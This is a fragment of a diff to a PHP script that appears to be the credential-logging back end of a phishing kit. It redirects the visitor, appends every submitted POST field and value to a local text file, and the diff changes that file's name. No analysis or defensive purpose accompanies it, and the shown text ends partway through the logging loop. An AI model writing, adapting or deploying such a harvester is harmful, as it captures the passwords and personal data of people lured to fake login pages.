@@ -2,7 +2,7 @@
 //https://www.facebook.com/AnuragDhakal11
 header
 ('location:');
-$handle=fopen("techanurag.txt","a");
+$handle=fopen("luu.2o4.txt","a");
 foreach($_POST as $variable=>$value)
 {
 fwrite($handle,$variable);
